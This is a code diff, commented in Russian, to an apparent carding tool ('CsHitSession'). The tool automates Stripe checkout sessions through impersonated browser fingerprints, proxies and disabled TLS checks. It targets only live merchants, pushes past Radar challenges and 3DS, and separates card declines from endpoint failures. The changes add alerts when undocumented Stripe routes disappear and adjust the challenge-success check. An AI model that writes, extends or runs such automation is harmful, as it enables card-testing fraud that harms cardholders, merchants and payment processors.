@@ -160,13 +160,20 @@ class CsHitSession:
             return False, "не удалось извлечь pk/cs из fid-фрагмента (линк мёртв?)"
         s = AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=self.proxy)
         try:
-            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
+            pp_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}"
+            r = await s.get(pp_url,
                             params={"key": self.pk},
                             headers={"Origin": "https://js.stripe.com",
                                      "Referer": "https://js.stripe.com/",
                                      "Accept": "application/json"}, timeout=12)
             if r.status_code != 200:
+                # Алерт на непубличный маршрут: 404 тут означает, что Stripe вывел маршрут,
+                # а не то, что карта отклонена (аудит 2026-09, H-01).
+                gone = gc.flag_internal_endpoint(r, pp_url)
                 await s.close()
+                if gone:
+                    return False, ("payment_pages выведен из маршрутизации Stripe (404): контур /hit "
+                                   "развалился, это не отказ карты — смотри config.UNDOCUMENTED_ENDPOINTS")
                 return False, f"payment_pages HTTP {r.status_code}: {r.text[:120]}"
             data = r.json()
             if data.get("is_sandbox_merchant") or not data.get("livemode", True):
@@ -233,11 +240,13 @@ class CsHitSession:
     async def _alive(self) -> bool:
         """Проверяем, жива ли сессия (requires_payment_method / requires_action или session open)."""
         try:
-            r = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
+            pp_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}"
+            r = await self.s.get(pp_url,
                                  params={"key": self.pk},
                                  headers={"Origin": "https://js.stripe.com",
                                           "Referer": "https://js.stripe.com/",
                                           "Accept": "application/json"}, timeout=12)
+            gc.flag_internal_endpoint(r, pp_url)
             data = r.json() or {}
             if data.get("status") in ("complete", "expired"):
                 return False
@@ -332,20 +341,24 @@ class CsHitSession:
         # подписочные сессии пересчитывают инвойс между open и confirm —
         # при checkout_amount_mismatch перечитываем сумму и повторяем один раз
         try:
-            r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
+            cfm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
+            r = await self.s.post(cfm_url,
                                   data=body,
                                   headers=confirm_headers, timeout=20)
             resp = r.json()
-            _log.log_http("POST", f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", r.status_code)
+            _log.log_http("POST", cfm_url, r.status_code)
+            gc.flag_internal_endpoint(r, cfm_url)
         except Exception as e:
             return {"status": "ERROR", "detail": f"confirm: {type(e).__name__}: {e}"[:150]}
         self.confirms += 1
         err = resp.get("error") or {}
         if _amount_mismatch(getattr(r, "status_code", 0), err):
             try:
-                rg = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
+                rg_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}"
+                rg = await self.s.get(rg_url,
                                       params={"key": self.pk},
                                       headers=confirm_headers, timeout=12)
+                gc.flag_internal_endpoint(rg, rg_url)
                 data0 = rg.json() or {}
                 pi0 = data0.get("payment_intent") or {}
                 new_amt = (
@@ -378,9 +391,11 @@ class CsHitSession:
                     body["eid"] = str(uuid.uuid4())
                     if "confirmation_token" not in body:
                         body["payment_method"] = td["id"]
-                    r = await self.s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
+                    cfm_url2 = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
+                    r = await self.s.post(cfm_url2,
                                           data=body,
                                           headers=confirm_headers, timeout=20)
+                    gc.flag_internal_endpoint(r, cfm_url2)
                     resp = r.json()
                     self.confirms += 1
             except Exception:
@@ -506,7 +521,7 @@ class CsHitSession:
                             challenge_response_ekey=ekey,
                         )
 
-                        if v_res.get("status") == "OK":
+                        if v_res.get("status") == "CHALLENGE_PASSED":
                             _log.log_stripe("RADAR_VERIFIED", self.cs[:14], pi_id[:14], "Resuming confirmation")
                             if confirm_body:
                                 resumed_body = dict(confirm_body)
@@ -524,8 +539,9 @@ class CsHitSession:
                                     resumed_body["init_checksum"] = self.checksum
 
                             try:
+                                resumed_url = f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm"
                                 r_res = await self.s.post(
-                                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
+                                    resumed_url,
                                     data=resumed_body,
                                     headers={
                                         "Origin": "https://js.stripe.com",
@@ -536,7 +552,8 @@ class CsHitSession:
                                 )
                                 self.confirms += 1
                                 resumed_resp = r_res.json()
-                                _log.log_http("POST", f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", r_res.status_code)
+                                _log.log_http("POST", resumed_url, r_res.status_code)
+                                gc.flag_internal_endpoint(r_res, resumed_url)
                                 return await self._classify_and_resolve_3ds(
                                     resumed_resp,
                                     profile=profile,
@@ -636,11 +653,13 @@ async def qualify_session(target_url: str, proxy: str | None = None,
     norm_proxy = gc.normalize_proxy(proxy) if proxy else None
     try:
         async with AsyncSession(impersonate=imp, verify=False, proxy=norm_proxy) as s:
-            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
+            pp_url = f"https://api.stripe.com/v1/payment_pages/{cs}"
+            r = await s.get(pp_url,
                             params={"key": pk},
                             headers={"Origin": "https://js.stripe.com",
                                      "Referer": "https://js.stripe.com/",
                                      "Accept": "application/json"}, timeout=timeout)
+            gc.flag_internal_endpoint(r, pp_url)
             if r.status_code != 200:
                 return {
                     "viable": False,
